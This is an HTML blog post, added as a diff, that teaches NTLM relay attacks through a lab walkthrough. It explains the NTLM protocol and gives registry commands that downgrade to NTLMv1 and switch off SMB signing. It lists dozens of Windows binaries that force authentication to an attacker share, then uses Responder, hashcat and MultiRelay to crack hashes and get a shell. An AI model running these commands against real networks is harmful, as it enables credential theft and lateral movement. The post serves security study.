@@ -1,0 +1,321 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>NTLM-Relay攻击 | Sand4o</title><meta name="author" content="Sand4o"><meta name="copyright" content="Sand4o"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="NTML-Relay前置知识什么是NTML协议NTLM（New Technology LAN Manager）协议是微软提供的一种安全协议，用于在Windows环境中进行身份验证。它基于质询响应机制，允许用户向服务器证明自己的身份，以便使用服务器提供的服务。NTLM协议的认证过程分为三个步骤：协商、质询和验证。在工作组环境中，用户使用服务器的本地账户进行认证；而在域环境中，用户使用域账户进行认证，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NTLM-Relay攻击">
+<meta property="og:url" content="https://sandao666.github.io/posts/48087.html">
+<meta property="og:site_name" content="Sand4o">
+<meta property="og:description" content="NTML-Relay前置知识什么是NTML协议NTLM（New Technology LAN Manager）协议是微软提供的一种安全协议，用于在Windows环境中进行身份验证。它基于质询响应机制，允许用户向服务器证明自己的身份，以便使用服务器提供的服务。NTLM协议的认证过程分为三个步骤：协商、质询和验证。在工作组环境中，用户使用服务器的本地账户进行认证；而在域环境中，用户使用域账户进行认证，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://api.vvhan.com/api/wallpaper/acg">
+<meta property="article:published_time" content="2024-06-25T06:23:06.456Z">
+<meta property="article:modified_time" content="2024-06-25T06:22:59.003Z">
+<meta property="article:author" content="Sand4o">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://api.vvhan.com/api/wallpaper/acg"><link rel="shortcut icon" href="/img/avatar.png"><link rel="canonical" href="https://sandao666.github.io/posts/48087.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'NTLM-Relay攻击',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-06-25 14:22:59'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/background.css"><link rel="stylesheet" href="/css/beijingxuhua2.css"><link rel="stylesheet" href="/css/jiazaitiao.css"><meta name="generator" content="Hexo 7.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://api.vvhan.com/api/wallpaper/acg')"><nav id="nav"><span id="blog-info"><a href="/" title="Sand4o"><span class="site-name">Sand4o</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">NTLM-Relay攻击</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-06-25T06:23:06.456Z" title="发表于 2024-06-25 14:23:06">2024-06-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-06-25T06:22:59.003Z" title="更新于 2024-06-25 14:22:59">2024-06-25</time></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="NTML-Relay前置知识"><a href="#NTML-Relay前置知识" class="headerlink" title="NTML-Relay前置知识"></a>NTML-Relay前置知识</h1><h2 id="什么是NTML协议"><a href="#什么是NTML协议" class="headerlink" title="什么是NTML协议"></a>什么是NTML协议</h2><p>NTLM（New Technology LAN Manager）协议是微软提供的一种安全协议，用于在Windows环境中进行身份验证。它基于质询响应机制，允许用户向服务器证明自己的身份，以便使用服务器提供的服务。NTLM协议的认证过程分为三个步骤：协商、质询和验证。在工作组环境中，用户使用服务器的本地账户进行认证；而在域环境中，用户使用域账户进行认证，服务器需要与域控制器交互来完成认证。NTLM协议虽然不直接传输密码，但使用了密码的哈希值NTLM Hash来进行身份验证。</p>
+<h2 id="NTLM认证过程"><a href="#NTLM认证过程" class="headerlink" title="NTLM认证过程"></a>NTLM认证过程</h2><p>在非域环境中</p>
+<ol>
+<li><p>当客户端需要访问服务器时，客户端需要输入服务器的用户名和密码进行验证，并且客户端会将服务器的NTLM-Hash值缓存。之后客户端开始向服务器发送 TYPE 1 Negotiate协商消息。</p>
+</li>
+<li><p>服务器收到客户端发送来的 TYPE 1 协商消息后，会取出其中自己能够接受的内容，传入NTLM SSP，得到 TYPE 2 挑战消息，此 TYPE 2消息中包含了一个由服务端生成的16位随机值，被称为 Challenge。服务器将此challenge保存一份后将TYPE 2消息发送回客户端。</p>
+</li>
+<li><p>客户端收到服务器发来的TYPE 2消息后，读出其中的challenge值，用缓存的服务端密码的NTLM-Hash对其进行加密，并与用户名、challenge等一起组合得到 Net-NTLMHash ，最后将 Net-NTLMHash 封装到 TYPE 3 NTLM_AUTH消息中发往服务器。</p>
+</li>
+<li><p>服务器在收到 TYPE 3 的消息之后，用自己密码的 NTLM-Hash 对 Challenge 进行加密，并比较自己计算出的 Net NTLM-Hash 认证消息和客户端发送的认证消息是否匹配。如果匹配，则证明客户端掌握了正确的密码，认证成功，否则认证失败。</p>
+</li>
+</ol>
+<p>如果是在域环境中，那么认证过程会经过域控制器：</p>
+<ol start="4">
+<li><p>服务器接收到客户端发送来的 TYPE 3 消息后，取出其中的Net NTLM-Hash值，并向域控制器发送针对客户端的验证请求。该请求的内容包含：用户名、原始的 Challenge 和 加密后的Challenge(也就是Net NTLM-Hash)。</p>
+</li>
+<li><p>DC根据用户名取出该帐号的密码哈希值 NTLM-Hash，用密码哈希值 NTLM-Hash 对原始的Challenge进行加密得到Net NTLM-Hash。如果加密后的Challenge和服务器发送的一致，则意味着用户拥有正确的密码，验证通过，否则验证失败。DC将验证结果发给服务器。</p>
+</li>
+</ol>
+<p>服务器根据DC返回的结果，对客户端进行回复</p>
+<h2 id="NTLM-Hash和Net-NTLM-Hash区别"><a href="#NTLM-Hash和Net-NTLM-Hash区别" class="headerlink" title="NTLM Hash和Net-NTLM Hash区别"></a>NTLM Hash和Net-NTLM Hash区别</h2><p><strong>NTLM Hash</strong>:</p>
+<p>NTLM Hash是微软为了提高安全性的同时保证兼容性而设计的散列加密算法。它是基于MD4加密算法进行加密的，用于在Windows系统中存储用户的密码信息。具体来说，NTLM Hash的生成过程包括以下几个步骤：</p>
+<ol>
+<li>将用户的密码转换为16进制格式。</li>
+<li>将16进制格式的字符串进行ASCII转Unicode编码。</li>
+<li>对Unicode编码的16进制字符串进行MD4单向哈希加密，得到最终的NTLM Hash值。</li>
+</ol>
+<p>在Windows Vista和Windows Server 2008之前的系统中，还会使用LM Hash，但从这两个版本开始，默认情况下只存储NTLM Hash，LM Hash将不再存在。通常情况下，NTLM Hash存储在Windows系统中的SAM文件或域控制器的NTDS.dit文件中。</p>
+<p>简单来说就是当用户注销、重启、锁屏后，操作系统就会让winlogon.exe<code>显示登录界面，也就是输入框。当</code>winlogon.exe<code>接收输入后，将密码交给</code>lsass.exe<code>进程，</code>lsass.exe进程中会存一份明文密码，登录时就需要将lsass.exe进程转换的明文密码hash与sam文件进行比对，这种方式即为本地认证。在渗透测试中，可以通过Mimikatz等工具读取lsass.exe进程，从而获得已登录用户的NTLM Hash或是明文密码。此外，在NTLM认证过程中，客户端会使用用户的NTLM Hash对服务器发送的Challenge进行加密，生成Response，以证明客户端用户已经知道账户密码</p>
+<p><strong>Net-NTLM Hash</strong>:</p>
+<p>Net-NTLM Hash是网络环境下NTLM（New Technology LAN Manager）认证协议中使用的一种密码哈希，它在客户端和服务器之间的身份验证过程中扮演重要角色。NTLM认证是一种质询&#x2F;响应（Challenge&#x2F;Response）机制，Net-NTLM Hash的生成和使用流程如下:</p>
+<ol>
+<li>客户端向服务器发送一个登录请求，通常包括明文的登录用户名。</li>
+<li>服务器接收到请求后，生成一个随机数（Challenge），并将其发送回客户端。</li>
+<li>客户端收到Challenge后，使用登录用户的密码NTLM Hash对Challenge进行加密，生成加密后的Response，并将这个Response发送给服务器。</li>
+<li>服务器接收到客户端发回的Response，使用存储的用户密码NTLM Hash对之前发送的Challenge进行加密，生成Challenge1。然后比较服务器生成的Challenge1和客户端发回的Response是否一致，如果一致则验证成功。</li>
+</ol>
+<p>Net-NTLM Hash与存储在Windows系统SAM文件中的本地NTLM Hash不同，它是在网络认证过程中，客户端用来响应服务器Challenge的加密结果。在NTLM认证中，根据使用的挑战&#x2F;响应协议的版本，存在不同格式的Net-NTLM Hash，包括Net-NTLM v1 Hash和Net-NTLM v2 Hash。Net-NTLM v1相对容易受到攻击，而Net-NTLM v2提供了更强的安全性。</p>
+<p>NTLMv1、NTLM v2区别在于:</p>
+<p>NTLM v1的Challenge有8位，NTLM v2的Challenge为16位。</p>
+<p>NTLM v1的主要加密算法是DES，NTLM v2的主要加密算法是HMAC-MD5。</p>
+<p>他们的共同点就是都是通过NTLM Hash进行的加密</p>
+<p> <strong>自Windows Vista&#x2F;Server2008开始起，微软默认使用Net-NTLMv2协议，想要降级到Net-NTLMv1，首先需要获得当前系统的管理员权限。2008 win7 及以上都是用了v2协议。2000 xp使用v1协议认证。</strong></p>
+<p>将系统的v2修改成v1</p>
+<p>(1)一条命令临时修改(适用：2008、2012、win7)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>(2)这种方法亦可，区别在于确保Net-NTLMv1开启成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 2 /f</span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\ /v NtlmMinClientSec /t REG_DWORD /d 536870912 /f</span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\ /v RestrictSendingNTLMTraffic /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="NTML-Relay攻击"><a href="#NTML-Relay攻击" class="headerlink" title="NTML-Relay攻击"></a>NTML-Relay攻击</h1><h2 id="Net-NTLM-Relay的攻击原理"><a href="#Net-NTLM-Relay的攻击原理" class="headerlink" title="Net-NTLM Relay的攻击原理"></a>Net-NTLM Relay的攻击原理</h2><p><strong>由于本文章只是关于NTML-Relay攻击的知识 所以关于针对NTLM Hash的攻击放在后面的文章来讲述</strong></p>
+<p>首先我们要知道Windows系统名称解析顺序<br>当我们访问一个共享时 net use \\ip\xxx，其寻找这个主机名称会遵循以下的步骤：</p>
+<ol>
+<li>本地hosts文件（%windir%\System32\drivers\etc\hosts）</li>
+<li>DNS缓存&#x2F;DNS服务器</li>
+<li>链路本地多播名称解析（LLMNR）和NetBIOS名称服务（NBT-NS）</li>
+</ol>
+<p>如果没有在1、2项中找到对应名称，系统就会通过链路本地多播名称解析（LLMNR）和Net-BIOS名称服务（NBT-NS）在本地进行名称解析。这时，客户端就会将未经认证的UDP广播到网络中，询问它是否为本地系统的名称，由于该过程未被认证，并且广播到整个网络，从而允许网络上的任何机器响应并声称是这台机器。</p>
+<p>因此当用户输入不存在、包含错误或者DNS中 没有的主机名时，通过Responder工具监听LLMNR和NetBIOS广播，就可以伪装成受害者要访问的这台机器，并从而让受害者交出相应的登陆凭证。核心过程与arp欺骗类似，我们可以让攻击者作中间人，截获到客户端的Net-NTLM Hash。</p>
+<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/652d27f3-9ac2-4d4d-8758-6bb0d92ea543.png" alt="652d27f3-9ac2-4d4d-8758-6bb0d92ea543"></p>
+<p>本地和缓存查询不到sfss时，内网主机就会将未经认证的UDP广播到网络中，询问谁是sfss，由于该过程未被认证，并且广播到整个网络，从而允许网络 上的任何机器响应并声称自己是sfss。此时kali伪装成sfss这台机器，接着进行ntlm认证。从而让受害者交出相应的登陆凭证(Net-NTLMhash)</p>
+<p>触发NTLM认证的命令，这里大多数用的SMB通信协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">net.exe use \\host\share</span><br><span class="line">attrib.exe \\host\share</span><br><span class="line">bcdboot.exe \\host\share</span><br><span class="line">bdeunlock.exe \\host\share</span><br><span class="line">cacls.exe \\host\share</span><br><span class="line">certreq.exe \\host\share #(noisy, pops an error dialog)</span><br><span class="line">certutil.exe \\host\share</span><br><span class="line">cipher.exe \\host\share</span><br><span class="line">ClipUp.exe -l \\host\share</span><br><span class="line">cmdl32.exe \\host\share</span><br><span class="line">cmstp.exe /s \\host\share</span><br><span class="line">colorcpl.exe \\host\share #(noisy, pops an error dialog)</span><br><span class="line">comp.exe /N=0 \\host\share \\host\share</span><br><span class="line">compact.exe \\host\share</span><br><span class="line">control.exe \\host\share</span><br><span class="line">convertvhd.exe -source \\host\share -destination \\host\share</span><br><span class="line">Defrag.exe \\host\share</span><br><span class="line">DeployUtil.exe /install \\host\share</span><br><span class="line">DevToolsLauncher.exe GetFileListing \\host\share #(this one&#x27;s cool. will return a file listing (json-formatted) from remote SMB share...)</span><br><span class="line">diskperf.exe \\host\share</span><br><span class="line">dispdiag.exe -out \\host\share</span><br><span class="line">doskey.exe /MACROFILE=\\host\share</span><br><span class="line">esentutl.exe /k \\host\share</span><br><span class="line">expand.exe \\host\share</span><br><span class="line">extrac32.exe \\host\share</span><br><span class="line">FileHistory.exe \\host\share #(noisy, pops a gui)</span><br><span class="line">findstr.exe * \\host\share</span><br><span class="line">fontview.exe \\host\share #(noisy, pops an error dialog)</span><br><span class="line">fvenotify.exe \\host\share #(noisy, pops an access denied error)</span><br><span class="line">FXSCOVER.exe \\host\share #(noisy, pops GUI)</span><br><span class="line">hwrcomp.exe -check \\host\share</span><br><span class="line">hwrreg.exe \\host\share</span><br><span class="line">icacls.exe \\host\share</span><br><span class="line">LaunchWinApp.exe \\host\share #(noisy, will pop an explorer window with the  contents of your SMB share.)</span><br><span class="line">licensingdiag.exe -cab \\host\share</span><br><span class="line">lodctr.exe \\host\share</span><br><span class="line">lpksetup.exe /p \\host\share /s</span><br><span class="line">makecab.exe \\host\share</span><br><span class="line">MdmDiagnosticsTool.exe -out \\host\share #(sends hash, and as a *bonus!* writes an MDMDiagReport.html to the attacker share with full CSP configuration.)</span><br><span class="line">mshta.exe \\host\share #(noisy, pops an HTA window)</span><br><span class="line">msiexec.exe /update \\host\share /quiet</span><br><span class="line">msinfo32.exe \\host\share #(noisy, pops a &quot;cannot open&quot; dialog)</span><br><span class="line">mspaint.exe \\host\share #(noisy, invalid path to png error)</span><br><span class="line">mspaint.exe \\host\share\share.png #(will capture hash, and display the remote PNG file to the user)</span><br><span class="line">msra.exe /openfile \\host\share #(noisy, error)</span><br><span class="line">mstsc.exe \\host\share #(noisy, error)</span><br><span class="line">netcfg.exe -l \\host\share -c p -i foo</span><br></pre></td></tr></table></figure>
+
+<h2 id="Net-NTLM-Relay攻击"><a href="#Net-NTLM-Relay攻击" class="headerlink" title="Net-NTLM Relay攻击"></a>Net-NTLM Relay攻击</h2><h3 id="暴力破解明文密码"><a href="#暴力破解明文密码" class="headerlink" title="暴力破解明文密码"></a>暴力破解明文密码</h3><p>首先攻击机利用kali工具(responder)进行监听</p>
+<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/1d4a5629-9657-4f14-a8d9-efe2883ad68d.png" alt="1d4a5629-9657-4f14-a8d9-efe2883ad68d"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 -v   //-I是指定网卡  -v是开启详细模式</span><br></pre></td></tr></table></figure>
+
+<p>受害者机器输入不能被解析的路径</p>
+<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/dbad0bb0-a36a-45e3-b7fb-4612f9ccba8b.png" alt="dbad0bb0-a36a-45e3-b7fb-4612f9ccba8b"></p>
+<p>监听到了这台机器的NTLM v2 凭证，这个v2凭证不能用来PTH，但是可以通过这个配合字典来破解出administrator的明文密码，可以通过hashcat来进行破解</p>
+<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/24862e23-9427-4d5a-bafa-f988dc8b949e.png" alt="24862e23-9427-4d5a-bafa-f988dc8b949e"></p>
+<p>保存下这个hash使用工具nth进行识别</p>
+<p>nth工具安装</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install name-that-hash </span><br></pre></td></tr></table></figure>
+
+<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/d244b8d8-375e-4d8a-9525-0d093188db56.png" alt="d244b8d8-375e-4d8a-9525-0d093188db56"></p>
+<p>可以看到识别到5600，接下来就可以使用hashcat进行爆破</p>
+<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/c9b99bd0-aa92-4241-97e1-3a5c94b464f0.png" alt="c9b99bd0-aa92-4241-97e1-3a5c94b464f0"></p>
+<p>可以看到已经成功爆破出明文密码 (使用john也能爆破出来)</p>
+<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/d049a38e-2f03-487b-af5a-63dc59f24084.png" alt="d049a38e-2f03-487b-af5a-63dc59f24084"></p>
+<p>当然攻击芝士很多 </p>
+<p>详细的可以看这篇文章</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.anquanke.com/post/id/193493</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193493#h2-17">Windows内网协议学习NTLM篇之发起NTLM请求-安全客 - 安全资讯平台</a></p>
+<h3 id="NTLM重放攻击"><a href="#NTLM重放攻击" class="headerlink" title="NTLM重放攻击"></a>NTLM重放攻击</h3><p>利用场景如 在获取了高权限域内Net-NTLM Hash后对密码进行了爆破，如果爆破不出来  这时，就可以使用NTLM重放攻击进行域内横向移动</p>
+<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/b7c87ff8-5929-4503-a976-ed94bbbb550b.png" alt="b7c87ff8-5929-4503-a976-ed94bbbb550b"></p>
+<p>重放本身的含义就是：攻击者利用网络监听或者其他方式盗取认证凭据，之后再把它重新发给认证服务器。</p>
+<p>因此NTLM重放攻击也就是将窃听到的客户端Net-NTLM hash，重放到服务端。而由于攻击者拥有了该凭证，因此服务端自然而然就认为攻击者就是客户端。如果这个凭据权限足够，那么就可以控制域内其它主机，所以凭据的权限很重要。这里攻击者其实就充当了一个中间人的身份。</p>
+<p><strong>攻击前提</strong></p>
+<p>NTLM Relay攻击时在域中通过relay到smb服务将管理组成员冲放到到一些敏感的机器上。</p>
+<p>因此relay到smb服务要求被攻击机器不能开启SMB签名，域内主机的 SMB 签名默认关闭，但域控是默认开启的。</p>
+<p><strong>实验环境</strong></p>
+<table>
+<thead>
+<tr>
+<th>虚拟机</th>
+<th>IP</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>kali(攻击机)</td>
+<td>192.168.52.129</td>
+</tr>
+<tr>
+<td>Win2003(域控)</td>
+<td>192.168.52.141</td>
+</tr>
+<tr>
+<td>Win2008(域成员登录)</td>
+<td>192.168.52.138</td>
+</tr>
+<tr>
+<td>Win7(受害机)</td>
+<td>192.168.52.143</td>
+</tr>
+</tbody></table>
+<p>1.先用RunFinger.py来查看下内网中开放的信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python RunFinger.py -i 192.168.52.0/24      //RunFinger.py在responder工具目录</span><br></pre></td></tr></table></figure>
+
+<p>若域内其他主机开启了SMB Signing，可通过命令关闭对应服务( Windows Server系列中RequireSecuritySignature子键默认值为1)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v RequireSecuritySignature /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+
+<p>2.修改responder的配置文件Responder.conf，不让其对 hash 进行抓取。将SMB和HTTP的On改为Off：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /usr/share/responder/Responder.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/221b64f7-0844-4309-b6f8-8b1d69cff405.png" alt="221b64f7-0844-4309-b6f8-8b1d69cff405"></p>
+<p>3.先开启responder进行监听</p>
+<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/effa06c9-ff13-430d-a8ba-d3477eb849cd.png" alt="effa06c9-ff13-430d-a8ba-d3477eb849cd"></p>
+<p>4.启动MultiRelay.py（MultiRelay.py工具在responder&#x2F;tools&#x2F;下）</p>
+<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/2fd56f7e-e263-458a-8ce1-73586be8f8fe.png" alt="2fd56f7e-e263-458a-8ce1-73586be8f8fe"></p>
+<p>5.利用高权限域内主机进行广播</p>
+<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/cc396094-dd60-4b50-a5eb-b0697ffc2614.png" alt="cc396094-dd60-4b50-a5eb-b0697ffc2614"></p>
+<p>（这里的net use \\dsadasda  随便写一个不存在的就行 传递一个SMB流量）</p>
+<p>6.返回了win7的shell 攻击成功</p>
